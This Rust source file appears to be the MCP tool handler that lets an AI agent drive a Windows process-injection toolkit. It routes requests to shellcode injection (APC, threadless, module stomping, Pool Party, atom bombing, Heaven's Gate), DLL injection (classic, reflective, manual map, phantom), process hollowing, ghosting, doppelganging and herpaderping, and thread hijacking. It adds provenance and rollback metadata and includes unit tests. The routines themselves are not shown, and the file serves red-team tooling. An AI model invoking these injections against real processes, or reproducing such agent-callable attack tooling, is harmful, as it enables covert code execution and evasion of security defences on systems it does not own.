//! MCP inject tool handler.

use serde_json::{json, Value};

use crate::mcp::action_registry::InjectAction;
use crate::mcp::tool_args::{
    invalid_registered_choice_error, missing_param_error, normalize_alias,
    require_module_name_param, require_str_param, require_typed_action, require_u64_param,
    unknown_registered_action_error,
};

pub(crate) fn handle_inject(args: &Value) -> Result<Value, String> {
    let result = dispatch_inject(args)?;
    Ok(attach_inject_provenance(args, result))
}

fn attach_inject_provenance(args: &Value, mut result: Value) -> Value {
    let provenance = inject_provenance(args);
    let mutation = inject_mutation_metadata(args, &result);
    let rollback = inject_rollback_metadata(args, &result);

    if let Some(obj) = result.as_object_mut() {
        obj.entry("provenance".to_string()).or_insert(provenance);
        obj.entry("mutation".to_string()).or_insert(mutation);
        obj.entry("rollback".to_string()).or_insert(rollback);
    }
    result
}

fn inject_provenance(args: &Value) -> Value {
    json!({
        "correlation_id": crate::observability::correlation_id_from_args(args),
        "request_id": args.get("request_id").cloned().unwrap_or(Value::Null),
        "task_id": args.get("task_id").cloned().unwrap_or(Value::Null),
        "chain_id": args.get("chain_id").cloned().unwrap_or(Value::Null),
        "purpose": args.get("purpose").cloned().unwrap_or(Value::Null),
    })
}

fn inject_mutation_metadata(args: &Value, result: &Value) -> Value {
    let action = args
        .get("action")
        .and_then(|value| value.as_str())
        .unwrap_or("");
    let technique = result
        .get("technique")
        .or_else(|| args.get("method"))
        .or_else(|| args.get("dll_method"))
        .or_else(|| args.get("spawn_method"))
        .cloned()
        .unwrap_or_else(|| json!(action));

    let mut captured_fields = vec!["action"];
    if result.get("pid").is_some() || args.get("pid").is_some() {
        captured_fields.push("pid");
    }
    if result.get("tid").is_some() || args.get("tid").is_some() {
        captured_fields.push("tid");
    }
    for field in [
        "shellcode_address",
        "stub_address",
        "thread_handle",
        "thread_id",
        "process_handle",
        "remote_base",
        "text_address",
        "entry_point",
        "function_address",
        "shellcode_cave",
        "trampoline_cave",
        "original_bytes",
        "dll_path",
        "target_exe",
    ] {
        if result.get(field).is_some() {
            captured_fields.push(field);
        }
    }
    captured_fields.sort_unstable();
    captured_fields.dedup();

    json!({
        "kind": "inject_live_mutation",
        "tool": "inject",
        "action": action,
        "technique": technique,
        "state_change": inject_state_change(action, args, result),
        "captured_fields": captured_fields,
        "target": {
            "pid": result.get("pid").or_else(|| args.get("pid")).cloned().unwrap_or(Value::Null),
            "tid": result.get("tid").or_else(|| args.get("tid")).or_else(|| result.get("thread_id")).cloned().unwrap_or(Value::Null),
        },
        "handler_boundary": "src/mcp/inject_tool.rs",
    })
}

fn inject_state_change(action: &str, args: &Value, result: &Value) -> &'static str {
    match action {
        "dll" => "remote_dll_load",
        "spawn" | "phantom_hollow" | "transacted_hollow" => "spawn_or_image_hollowing",
        "hijack_redirect" | "hijack_restore" | "hijack_backup" | "hijack_wait" => {
            "thread_context_workflow"
        }
        "export_forward" => "remote_export_table_patch",
        "shellcode" => match args.get("method").and_then(|value| value.as_str()) {
            Some("threadless") => "remote_function_patch",
            Some("stomp") => "remote_module_stomp",
            Some("wow64") | Some("heaven_gate") => "cross_arch_execution",
            _ => "remote_payload_thread_execution",
        },
        "fiber"
        | "threadpool"
        | "stack_bomb"
        | "pool_party_worker"
        | "pool_party_work"
        | "pool_party_direct"
        | "pool_party_timer"
        | "create_remote_thread"
        | "nt_create_thread" => "remote_payload_thread_execution",
        _ if result.get("original_bytes").is_some() => "remote_code_patch",
        _ => "remote_process_mutation",
    }
}

fn inject_rollback_metadata(args: &Value, result: &Value) -> Value {
    let action = args
        .get("action")
        .and_then(|value| value.as_str())
        .unwrap_or("");

    if let Some(rollback) = threadless_rollback(args, result) {
        return rollback;
    }
    if let Some(rollback) = remote_payload_cleanup_rollback(args, result) {
        return rollback;
    }
    if let Some(rollback) = thread_context_rollback(args, result) {
        return rollback;
    }
    if matches!(action, "spawn" | "phantom_hollow" | "transacted_hollow") {
        return spawn_rollback(args, result);
    }
    if action == "dll" {
        return dll_injection_rollback(args, result);
    }
    if action == "export_forward" {
        return export_forward_rollback(args, result);
    }

    json!({
        "available": false,
        "strategy": "none",
        "captured_fields": captured_rollback_fields(args, result),
        "reason": "no_inject_rollback_metadata",
        "detail": "inject live handler did not expose enough state for an executable rollback action",
    })
}

fn remote_payload_cleanup_rollback(args: &Value, result: &Value) -> Option<Value> {
    let pid = result.get("pid").or_else(|| args.get("pid"))?.clone();
    let mut addresses = Vec::new();
    for field in [
        "shellcode_address",
        "stub_address",
        "remote_base",
        "text_address",
        "shellcode_cave",
        "trampoline_cave",
    ] {
        if let Some(address) = result.get(field).and_then(parse_result_address) {
            addresses.push(json!(address));
        }
    }
    let mut thread_handles = Vec::new();
    if let Some(handle) = result.get("thread_handle") {
        thread_handles.push(handle.clone());
    }

    if addresses.is_empty() && thread_handles.is_empty() {
        return None;
    }

    let rollback_args = json!({
        "action": "cleanup",
        "pid": pid,
        "addresses": addresses,
        "thread_handles": thread_handles,
    });
    Some(json!({
        "available": true,
        "strategy": "cleanup_remote_payload_resources",
        "captured_fields": captured_rollback_fields(&rollback_args, result),
        "action": {
            "tool": "payload",
            "action": "cleanup",
            "args": rollback_args,
        },
        "detail": "live inject result exposed remote allocation or thread handle fields that can be passed to payload(action='cleanup')",
    }))
}

fn threadless_rollback(args: &Value, result: &Value) -> Option<Value> {
    let pid = result.get("pid").or_else(|| args.get("pid"))?.clone();
    let function_address = result.get("function_address")?.clone();
    let original_bytes = result.get("original_bytes")?.clone();
    let action_args = json!({
        "action": "restore",
        "pid": pid,
        "address": function_address,
        "original_bytes": original_bytes,
    });
    Some(json!({
        "available": true,
        "strategy": "restore_threadless_original_bytes",
        "captured_fields": ["pid", "function_address", "original_bytes"],
        "action": {
            "tool": "hook",
            "action": "restore",
            "args": action_args,
        },
        "detail": "threadless injection exposed patched function bytes and can be restored through hook(action='restore')",
    }))
}

fn thread_context_rollback(args: &Value, result: &Value) -> Option<Value> {
    let action = args.get("action").and_then(|value| value.as_str())?;
    if action != "hijack_redirect" {
        return None;
    }
    let tid = result.get("tid").or_else(|| args.get("tid"))?.clone();
    let original_rip = result.get("original_rip")?.clone();
    let rollback_args = json!({
        "action": "hijack_restore",
        "tid": tid,
        "rip": original_rip,
    });
    Some(json!({
        "available": "partial",
        "strategy": "restore_thread_context",
        "captured_fields": ["tid", "original_rip"],
        "action": {
            "tool": "inject",
            "action": "hijack_restore",
            "args": rollback_args,
        },
        "detail": "live redirect result exposed original RIP, but a full restore may require the original complete thread context snapshot",
    }))
}

fn spawn_rollback(args: &Value, result: &Value) -> Value {
    json!({
        "available": "partial",
        "strategy": "terminate_spawned_process_and_cleanup_image",
        "captured_fields": captured_rollback_fields(args, result),
        "detail": "spawn and hollowing rollback can terminate captured process/thread handles when available, but cannot undo already-running payload side effects",
    })
}

fn dll_injection_rollback(args: &Value, result: &Value) -> Value {
    json!({
        "available": "manual",
        "strategy": "unload_remote_library_if_handle_known",
        "captured_fields": captured_rollback_fields(args, result),
        "detail": "classic DLL injection exposes target and dll path, but executable rollback needs a remote module handle or unload routine",
    })
}

fn export_forward_rollback(args: &Value, result: &Value) -> Value {
    json!({
        "available": "partial",
        "strategy": "restore_export_rva",
        "captured_fields": captured_rollback_fields(args, result),
        "detail": "export forwarding hijack exposes original_rva and module_base, but executable rollback needs the export table RVA address captured by the live handler",
    })
}

fn captured_rollback_fields(args: &Value, result: &Value) -> Vec<&'static str> {
    let mut fields = Vec::new();
    for (field, source) in [
        ("pid", result),
        ("tid", result),
        ("thread_handle", result),
        ("thread_id", result),
        ("shellcode_address", result),
        ("stub_address", result),
        ("remote_base", result),
        ("text_address", result),
        ("entry_point", result),
        ("function_address", result),
        ("shellcode_cave", result),
        ("trampoline_cave", result),
        ("original_bytes", result),
        ("original_rip", result),
        ("original_rva", result),
        ("module_base", result),
        ("dll_path", result),
        ("target_exe", result),
        ("pid", args),
        ("tid", args),
        ("dll_path", args),
        ("target_path", args),
    ] {
        if source.get(field).is_some() {
            fields.push(field);
        }
    }
    fields.sort_unstable();
    fields.dedup();
    fields
}

fn parse_result_address(value: &Value) -> Option<u64> {
    crate::util::parse_address(value)
}

fn dispatch_inject(args: &Value) -> Result<Value, String> {
    let action = require_typed_action(args, "inject")?;
    let typed_action = InjectAction::try_from(&action)
        .map_err(|_| unknown_registered_action_error("inject", action.as_str()))?;

    match typed_action {
        // Shellcode injection
        InjectAction::Shellcode => {
            let method = args
                .get("method")
                .and_then(|v| v.as_str())
                .unwrap_or("thread");
            match method {
                "thread" | "apc" | "special_apc" | "mapping" | "mockingjay" | "atom"
                | "callback_enum" | "propagate" | "instrumentation" | "kernel_callback"
                | "stomp" | "threadless" | "workitem" | "pool_party" => {
                    require_u64_param(args, "pid", "inject", "shellcode")?;
                    if !matches!(method, "mockingjay") {
                        require_str_param(
                            args,
                            "shellcode",
                            "inject",
                            "shellcode",
                            Some("Provide shellcode bytes. Use a byte array for most methods, or base64 text for wow64/heaven_gate."),
                        ).or_else(|_| {
                            args.get("shellcode")
                                .and_then(|v| v.as_array())
                                .map(|_| "ok")
                                .ok_or_else(|| missing_param_error("inject", "shellcode", "shellcode", Some("Provide shellcode bytes. Use a byte array for most methods, or base64 text for wow64/heaven_gate.")))
                        })?;
                    }
                }
                "wow64" | "heaven_gate" => {
                    if method == "wow64" {
                        require_u64_param(args, "pid", "inject", "shellcode")?;
                    }
                    require_str_param(
                        args,
                        "shellcode",
                        "inject",
                        "shellcode",
                        Some("Provide base64-encoded shellcode for wow64/heaven_gate execution."),
                    )?;
                }
                _ => {
                    return Err(invalid_registered_choice_error(
                        "inject",
                        "shellcode",
                        "method",
                        method,
                    ))
                }
            }

            match method {
                "thread" => crate::inject::inject_shellcode(args).map_err(|e| e.to_string()),
                "apc" => crate::redteam::apc_inject(args).map_err(|e| e.to_string()),
                "special_apc" => {
                    crate::inject::thread::special_apc_inject(args).map_err(|e| e.to_string())
                }
                "mapping" => crate::inject::hollow::mapping_inject(args).map_err(|e| e.to_string()),
                "mockingjay" => {
                    crate::inject::hollow::mockingjay_inject(args).map_err(|e| e.to_string())
                }
                "atom" => crate::inject::callback::atom_bombing(args).map_err(|e| e.to_string()),
                "callback_enum" => {
                    crate::inject::callback::callback_inject_enum(args).map_err(|e| e.to_string())
                }
                "propagate" => {
                    crate::inject::callback::propagate_inject(args).map_err(|e| e.to_string())
                }
                "instrumentation" => crate::inject::callback::instrumentation_callback(args)
                    .map_err(|e| e.to_string()),
                "kernel_callback" => crate::inject::callback::kernel_callback_table_hijack(args)
                    .map_err(|e| e.to_string()),
                "wow64" => {
                    crate::inject::wow64::wow64_inject_shellcode(args).map_err(|e| e.to_string())
                }
                "heaven_gate" => {
                    crate::inject::wow64::heaven_gate_execute(args).map_err(|e| e.to_string())
                }
                "stomp" => {
                    crate::inject::stomping::module_stomping_inject(args).map_err(|e| e.to_string())
                }
                "threadless" => {
                    crate::inject::threadless::threadless_inject(args).map_err(|e| e.to_string())
                }
                "workitem" => {
                    crate::inject::workitem::work_item_inject(args).map_err(|e| e.to_string())
                }
                "pool_party" => {
                    crate::inject::poolparty::pool_party_inject(args).map_err(|e| e.to_string())
                }
                _ => Err(invalid_registered_choice_error(
                    "inject",
                    "shellcode",
                    "method",
                    method,
                )),
            }
        }

        // DLL injection
        InjectAction::Dll => {
            let dll_method = args
                .get("dll_method")
                .and_then(|v| v.as_str())
                .unwrap_or("classic");
            require_u64_param(args, "pid", "inject", "dll")?;
            require_str_param(
                args,
                "dll_path",
                "inject",
                "dll",
                Some("Provide the DLL path to inject, e.g. dll_path='C:\\temp\\payload.dll'."),
            )?;
            match dll_method {
                "classic" => crate::inject::inject_dll(args).map_err(|e| e.to_string()),
                "manual_map" => {
                    crate::inject::dll::manual_map_inject(args).map_err(|e| e.to_string())
                }
                "phantom" => {
                    crate::inject::phantom::phantom_dll_inject(args).map_err(|e| e.to_string())
                }
                "reflective" => {
                    crate::inject::dll::reflective_dll_inject(args).map_err(|e| e.to_string())
                }
                _ => Err(invalid_registered_choice_error(
                    "inject",
                    "dll",
                    "dll_method",
                    dll_method,
                )),
            }
        }

        // Process spawning
        InjectAction::Spawn => {
            let spawn_method = args
                .get("spawn_method")
                .and_then(|v| v.as_str())
                .unwrap_or("hollow");
            let normalized = normalize_alias(args, "target_exe", "target_path", "inject", "spawn");
            require_str_param(
                &normalized,
                "target_exe",
                "inject",
                "spawn",
                Some("Provide the executable path to launch or hollow."),
            )?;
            match spawn_method {
                "hollow" => {
                    require_str_param(
                        &normalized,
                        "payload",
                        "inject",
                        "spawn",
                        Some("Provide PE payload bytes for hollow/transacted spawn methods."),
                    ).or_else(|_| {
                        normalized
                            .get("payload")
                            .and_then(|v| v.as_array())
                            .map(|_| "ok")
                            .ok_or_else(|| missing_param_error("inject", "spawn", "payload", Some("Provide PE payload bytes for hollow/transacted spawn methods.")))
                    })?;
                    crate::inject::hollow::process_hollow(&normalized).map_err(|e| e.to_string())
                }
                "ghost" => {
                    crate::evasion::ghost::process_ghost(&normalized).map_err(|e| e.to_string())
                }
                "doppelgang" => crate::evasion::doppel::process_doppelgang(&normalized)
                    .map_err(|e| e.to_string()),
                "herpaderp" => crate::evasion::herpaderp::process_herpaderp(&normalized)
                    .map_err(|e| e.to_string()),
                "early_bird" => {
                    require_str_param(
                        &normalized,
                        "shellcode",
                        "inject",
                        "spawn",
                        Some("Provide shellcode bytes for early_bird spawn."),
                    )
                    .or_else(|_| {
                        normalized
                            .get("shellcode")
                            .and_then(|v| v.as_array())
                            .map(|_| "ok")
                            .ok_or_else(|| {
                                missing_param_error(
                                    "inject",
                                    "spawn",
                                    "shellcode",
                                    Some("Provide shellcode bytes for early_bird spawn."),
                                )
                            })
                    })?;
                    crate::inject::earlybird::early_bird_inject(&normalized)
                        .map_err(|e| e.to_string())
                }
                "transacted" => {
                    require_str_param(
                        &normalized,
                        "payload",
                        "inject",
                        "spawn",
                        Some("Provide PE payload bytes for hollow/transacted spawn methods."),
                    ).or_else(|_| {
                        normalized
                            .get("payload")
                            .and_then(|v| v.as_array())
                            .map(|_| "ok")
                            .ok_or_else(|| missing_param_error("inject", "spawn", "payload", Some("Provide PE payload bytes for hollow/transacted spawn methods.")))
                    })?;
                    crate::inject::hollow::transacted_hollow(&normalized).map_err(|e| e.to_string())
                }
                _ => Err(invalid_registered_choice_error(
                    "inject",
                    "spawn",
                    "spawn_method",
                    spawn_method,
                )),
            }
        }

        // Thread hijacking workflow
        InjectAction::HijackEnum => {
            require_u64_param(args, "pid", "inject", "hijack_enum")?;
            crate::inject::enumerate_threads(args).map_err(|e| e.to_string())
        }
        InjectAction::HijackBackup => {
            require_u64_param(args, "tid", "inject", "hijack_backup")?;
            crate::inject::backup_thread_context(args).map_err(|e| e.to_string())
        }
        InjectAction::HijackRedirect => {
            require_u64_param(args, "tid", "inject", "hijack_redirect")?;
            crate::inject::thread_hijack(args).map_err(|e| e.to_string())
        }
        InjectAction::HijackRestore => {
            require_u64_param(args, "tid", "inject", "hijack_restore")?;
            crate::inject::restore_thread_context(args).map_err(|e| e.to_string())
        }
        InjectAction::HijackWait => {
            require_u64_param(args, "tid", "inject", "hijack_wait")?;
            crate::inject::wait_for_thread_execution(args).map_err(|e| e.to_string())
        }

        // Direct thread creation
        InjectAction::CreateRemoteThread => {
            require_u64_param(args, "pid", "inject", "create_remote_thread")?;
            let normalized = normalize_alias(
                args,
                "start_address",
                "address",
                "inject",
                "create_remote_thread",
            );
            require_u64_param(
                &normalized,
                "start_address",
                "inject",
                "create_remote_thread",
            )?;
            crate::inject::shellcode::create_remote_thread(&normalized).map_err(|e| e.to_string())
        }
        InjectAction::NtCreateThread => {
            require_u64_param(args, "pid", "inject", "nt_create_thread")?;
            let normalized = normalize_alias(
                args,
                "start_address",
                "address",
                "inject",
                "nt_create_thread",
            );
            require_u64_param(&normalized, "start_address", "inject", "nt_create_thread")?;
            crate::inject::shellcode::nt_create_thread_ex(&normalized).map_err(|e| e.to_string())
        }

        // Fiber & thread pool injection
        InjectAction::Fiber => {
            require_u64_param(args, "pid", "inject", "fiber")?;
            require_str_param(
                args,
                "shellcode",
                "inject",
                "fiber",
                Some("Provide shellcode bytes for fiber injection."),
            )
            .or_else(|_| {
                args.get("shellcode")
                    .and_then(|v| v.as_array())
                    .map(|_| "ok")
                    .ok_or_else(|| {
                        missing_param_error(
                            "inject",
                            "fiber",
                            "shellcode",
                            Some("Provide shellcode bytes for fiber injection."),
                        )
                    })
            })?;
            crate::inject::thread::fiber_inject(args).map_err(|e| e.to_string())
        }
        InjectAction::Threadpool => {
            require_u64_param(args, "pid", "inject", "threadpool")?;
            require_str_param(
                args,
                "shellcode",
                "inject",
                "threadpool",
                Some("Provide shellcode bytes for threadpool injection."),
            )
            .or_else(|_| {
                args.get("shellcode")
                    .and_then(|v| v.as_array())
                    .map(|_| "ok")
                    .ok_or_else(|| {
                        missing_param_error(
                            "inject",
                            "threadpool",
                            "shellcode",
                            Some("Provide shellcode bytes for threadpool injection."),
                        )
                    })
            })?;
            crate::inject::thread::threadpool_inject(args).map_err(|e| e.to_string())
        }
        InjectAction::StackBomb => {
            require_u64_param(args, "pid", "inject", "stack_bomb")?;
            require_str_param(
                args,
                "shellcode",
                "inject",
                "stack_bomb",
                Some("Provide shellcode bytes for stack bomb injection."),
            )
            .or_else(|_| {
                args.get("shellcode")
                    .and_then(|v| v.as_array())
                    .map(|_| "ok")
                    .ok_or_else(|| {
                        missing_param_error(
                            "inject",
                            "stack_bomb",
                            "shellcode",
                            Some("Provide shellcode bytes for stack bomb injection."),
                        )
                    })
            })?;
            crate::inject::thread::stack_bomb(args).map_err(|e| e.to_string())
        }

        // Pool Party variants
        InjectAction::PoolPartyWorker => {
            require_u64_param(args, "pid", "inject", "pool_party_worker")?;
            require_str_param(
                args,
                "shellcode",
                "inject",
                "pool_party_worker",
                Some("Provide shellcode bytes for Pool Party execution."),
            )
            .or_else(|_| {
                args.get("shellcode")
                    .and_then(|v| v.as_array())
                    .map(|_| "ok")
                    .ok_or_else(|| {
                        missing_param_error(
                            "inject",
                            "pool_party_worker",
                            "shellcode",
                            Some("Provide shellcode bytes for Pool Party execution."),
                        )
                    })
            })?;
            crate::inject::poolparty::pool_party_worker_factory(args).map_err(|e| e.to_string())
        }
        InjectAction::PoolPartyWork => {
            require_u64_param(args, "pid", "inject", "pool_party_work")?;
            require_str_param(
                args,
                "shellcode",
                "inject",
                "pool_party_work",
                Some("Provide shellcode bytes for Pool Party execution."),
            )
            .or_else(|_| {
                args.get("shellcode")
                    .and_then(|v| v.as_array())
                    .map(|_| "ok")
                    .ok_or_else(|| {
                        missing_param_error(
                            "inject",
                            "pool_party_work",
                            "shellcode",
                            Some("Provide shellcode bytes for Pool Party execution."),
                        )
                    })
            })?;
            crate::inject::poolparty::pool_party_tp_work(args).map_err(|e| e.to_string())
        }
        InjectAction::PoolPartyDirect => {
            require_u64_param(args, "pid", "inject", "pool_party_direct")?;
            require_str_param(
                args,
                "shellcode",
                "inject",
                "pool_party_direct",
                Some("Provide shellcode bytes for Pool Party execution."),
            )
            .or_else(|_| {
                args.get("shellcode")
                    .and_then(|v| v.as_array())
                    .map(|_| "ok")
                    .ok_or_else(|| {
                        missing_param_error(
                            "inject",
                            "pool_party_direct",
                            "shellcode",
                            Some("Provide shellcode bytes for Pool Party execution."),
                        )
                    })
            })?;
            crate::inject::poolparty::pool_party_tp_direct(args).map_err(|e| e.to_string())
        }
        InjectAction::PoolPartyTimer => {
            require_u64_param(args, "pid", "inject", "pool_party_timer")?;
            require_str_param(
                args,
                "shellcode",
                "inject",
                "pool_party_timer",
                Some("Provide shellcode bytes for Pool Party execution."),
            )
            .or_else(|_| {
                args.get("shellcode")
                    .and_then(|v| v.as_array())
                    .map(|_| "ok")
                    .ok_or_else(|| {
                        missing_param_error(
                            "inject",
                            "pool_party_timer",
                            "shellcode",
                            Some("Provide shellcode bytes for Pool Party execution."),
                        )
                    })
            })?;
            crate::inject::poolparty::pool_party_tp_timer(args).map_err(|e| e.to_string())
        }

        // Advanced DLL injection
        InjectAction::ExportForward => {
            require_u64_param(args, "pid", "inject", "export_forward")?;
            require_module_name_param(
                args,
                "module",
                "inject",
                "export_forward",
                Some("Provide the loaded module name whose export table will be patched."),
            )?;
            require_str_param(
                args,
                "export_name",
                "inject",
                "export_forward",
                Some("Provide the exported symbol name to redirect."),
            )?;
            require_str_param(
                args,
                "shellcode",
                "inject",
                "export_forward",
                Some("Provide shellcode bytes to receive redirected export execution."),
            )
            .or_else(|_| {
                args.get("shellcode")
                    .and_then(|v| v.as_array())
                    .map(|_| "ok")
                    .ok_or_else(|| {
                        missing_param_error(
                            "inject",
                            "export_forward",
                            "shellcode",
                            Some("Provide shellcode bytes to receive redirected export execution."),
                        )
                    })
            })?;
            crate::inject::dll::export_forwarding_hijack(args).map_err(|e| e.to_string())
        }
        InjectAction::PhantomHollow => {
            require_u64_param(args, "pid", "inject", "phantom_hollow")?;
            require_str_param(
                args,
                "dll_path",
                "inject",
                "phantom_hollow",
                Some("Provide the DLL path for phantom hollowing."),
            )?;
            crate::inject::hollow::phantom_dll_hollow(args).map_err(|e| e.to_string())
        }
        InjectAction::TransactedHollow => {
            require_u64_param(args, "pid", "inject", "transacted_hollow")?;
            require_str_param(
                args,
                "dll_path",
                "inject",
                "transacted_hollow",
                Some("Provide the DLL path for transacted hollowing."),
            )?;
            crate::inject::phantom::transacted_hollowing(args).map_err(|e| e.to_string())
        }

        // WoW64 detection
        InjectAction::Wow64Detect => {
            require_u64_param(args, "pid", "inject", "wow64_detect")?;
            crate::inject::wow64::detect_wow64_mismatch(args).map_err(|e| e.to_string())
        }
    }
}

#[cfg(test)]
mod tests {
    use super::*;
    use serde_json::json;

    #[test]
    fn shellcode_rejects_unknown_method() {
        let error = handle_inject(&json!({"action": "shellcode", "method": "unknown"}))
            .expect_err("unknown shellcode method should fail before execution");

        assert!(error.contains("inject(action='shellcode')"));
        assert!(error.contains("method"));
        assert!(error.contains("thread"));
    }

    #[test]
    fn shellcode_requires_payload_after_pid() {
        let error = handle_inject(&json!({"action": "shellcode", "pid": 1234}))
            .expect_err("shellcode injection should require shellcode bytes");

        assert!(error.contains("inject(action='shellcode')"));
        assert!(error.contains("shellcode"));
    }

    #[test]
    fn dll_rejects_unknown_method_after_required_fields() {
        let error = handle_inject(&json!({
            "action": "dll",
            "pid": 1234,
            "dll_path": "C:\\temp\\payload.dll",
            "dll_method": "unknown"
        }))
        .expect_err("unknown DLL method should fail before injection");

        assert!(error.contains("inject(action='dll')"));
        assert!(error.contains("dll_method"));
        assert!(error.contains("manual_map"));
    }

    #[test]
    fn spawn_accepts_target_path_alias_before_payload_validation() {
        let error = handle_inject(&json!({
            "action": "spawn",
            "target_path": "C:\\Windows\\System32\\notepad.exe"
        }))
        .expect_err("target_path alias should normalize before payload validation");

        assert!(error.contains("inject(action='spawn')"));
        assert!(error.contains("payload"));
    }

    #[test]
    fn create_remote_thread_requires_start_address() {
        let error = handle_inject(&json!({"action": "create_remote_thread", "pid": 1234}))
            .expect_err("remote thread creation should require start address");

        assert!(error.contains("inject(action='create_remote_thread')"));
        assert!(error.contains("start_address"));
    }

    #[test]
    fn export_forward_rejects_path_like_module_names() {
        let error = handle_inject(&json!({
            "action": "export_forward",
            "pid": 1234,
            "module": "C:\\Windows\\System32\\kernel32.dll"
        }))
        .expect_err("module paths should fail before export table patching");

        assert!(error.contains("inject(action='export_forward')"));
        assert!(error.contains("module"));
        assert!(error.contains("path separators"));
    }

    #[test]
    fn inject_success_results_receive_provenance_metadata() {
        let result = attach_inject_provenance(
            &json!({
                "action": "shellcode",
                "request_id": "req-inject",
                "task_id": "task-inject",
                "chain_id": "chain-inject",
                "purpose": "test injection provenance"
            }),
            json!({
                "success": true,
                "technique": "unit-test",
                "pid": 1234,
                "shellcode_address": "0x1000",
                "shellcode_size": 16,
                "thread_handle": 55
            }),
        );

        assert_eq!(result["provenance"]["correlation_id"], "req-inject");
        assert_eq!(result["provenance"]["request_id"], "req-inject");
        assert_eq!(result["provenance"]["task_id"], "task-inject");
        assert_eq!(result["provenance"]["chain_id"], "chain-inject");
        assert_eq!(result["provenance"]["purpose"], "test injection provenance");
        assert_eq!(result["mutation"]["kind"], "inject_live_mutation");
        assert_eq!(
            result["mutation"]["state_change"],
            "remote_payload_thread_execution"
        );
        assert_eq!(
            result["rollback"]["strategy"],
            "cleanup_remote_payload_resources"
        );
        assert_eq!(result["rollback"]["action"]["tool"], "payload");
        assert_eq!(result["rollback"]["action"]["action"], "cleanup");
        assert_eq!(result["rollback"]["action"]["args"]["addresses"][0], 4096);
        assert_eq!(
            result["rollback"]["action"]["args"]["thread_handles"][0],
            55
        );
    }

    #[test]
    fn inject_success_preserves_handler_supplied_provenance() {
        let result = attach_inject_provenance(
            &json!({"action": "shellcode", "request_id": "req-wrapper"}),
            json!({
                "success": true,
                "provenance": {
                    "request_id": "req-handler"
                }
            }),
        );

        assert_eq!(result["provenance"]["request_id"], "req-handler");
    }

    #[test]
    fn threadless_injection_result_gets_executable_restore_rollback() {
        let result = attach_inject_provenance(
            &json!({
                "action": "shellcode",
                "method": "threadless",
                "request_id": "req-threadless"
            }),
            json!({
                "success": true,
                "technique": "threadless_injection",
                "pid": 4321,
                "function_address": "0x7FF700001000",
                "shellcode_cave": "0x7FF700002000",
                "trampoline_cave": "0x7FF700003000",
                "original_bytes": "48 8B C4 55"
            }),
        );

        assert_eq!(result["mutation"]["state_change"], "remote_function_patch");
        assert_eq!(
            result["rollback"]["strategy"],
            "restore_threadless_original_bytes"
        );
        assert_eq!(result["rollback"]["action"]["tool"], "hook");
        assert_eq!(result["rollback"]["action"]["action"], "restore");
        assert_eq!(
            result["rollback"]["action"]["args"]["address"],
            "0x7FF700001000"
        );
        assert_eq!(
            result["rollback"]["action"]["args"]["original_bytes"],
            "48 8B C4 55"
        );
    }

    #[test]
    fn hijack_redirect_result_gets_partial_context_rollback() {
        let result = attach_inject_provenance(
            &json!({"action": "hijack_redirect", "tid": 99}),
            json!({
                "success": true,
                "tid": 99,
                "original_rip": "0x140001000",
                "new_rip": "0x250000000"
            }),
        );

        assert_eq!(
            result["mutation"]["state_change"],
            "thread_context_workflow"
        );
        assert_eq!(result["rollback"]["available"], "partial");
        assert_eq!(result["rollback"]["strategy"], "restore_thread_context");
        assert_eq!(result["rollback"]["action"]["tool"], "inject");
        assert_eq!(result["rollback"]["action"]["action"], "hijack_restore");
    }
}
